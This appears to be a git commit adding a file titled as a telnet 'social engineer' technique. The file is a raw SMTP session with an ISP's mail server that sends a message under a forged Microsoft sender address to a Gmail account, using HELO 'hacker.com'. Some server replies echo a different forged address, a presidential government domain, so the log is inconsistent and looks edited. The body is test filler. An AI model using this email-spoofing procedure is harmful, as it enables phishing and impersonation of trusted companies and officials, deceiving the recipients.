31b8b3a358e2a5e40e054a477f442e9b5d650ffa
Doni Andrian <91331154+BlackArch8@users.noreply.github.com>
2022-07-05 22:07:24 +0700

    Add files via upload

---
+++ Telnet Email Social Engineer.bash
@@ -0,0 +1,40 @@
+telnet smtp.telkom.net 25
+Trying 118.97.10.38...
+Connected to smtp.telkom.net.
+Escape character is '^]'.
+220 SMTP2-D2-CKA.telkom.net ESMTP Smtpd; Wed, 15 Apr 2020 21:58:05 +0700
+helo
+501 5.0.0 helo requires domain address
+helo hacker.com
+250 SMTP2-D2-CKA.telkom.net Hello [125.166.219.174], pleased to meet you
+mail from: <msa@communication.microsoft.com>
+250 2.1.0 <msa@communication.microsoft.com>... Sender ok
+rcpt to: <apm.clayanonymous@gmail.com>
+250 2.1.5 <apm.clayanonymous@gmail.com>... Recipient ok
+from: msa@communication.microsoft.com
+500 5.5.1 Command unrecognized: "from: jokowi@presidenri.go.id"
+From: msa@communication.microsoft.com
+500 5.5.1 Command unrecognized: "From: jokowi@presidenri.go.id"
+data
+354 Enter mail, end with "." on a line by itself
+From: msa@communication.microsoft.com
+TO: apm.clayanonymous@gmail.com
+Subject: test..........
+
+testttstststtstststtstststststtsts isisisisisiis
+asdasd
+asd
+asd
+asd
+asd
+asd
+asd
+
+ty
+
+
+.
+250 2.0.0 03FEw59i032713-03FEw59j032713 Message accepted for delivery
+quit
+221 2.0.0 SMTP2-D2-CKA.telkom.net closing connection
+Connection closed by foreign host.
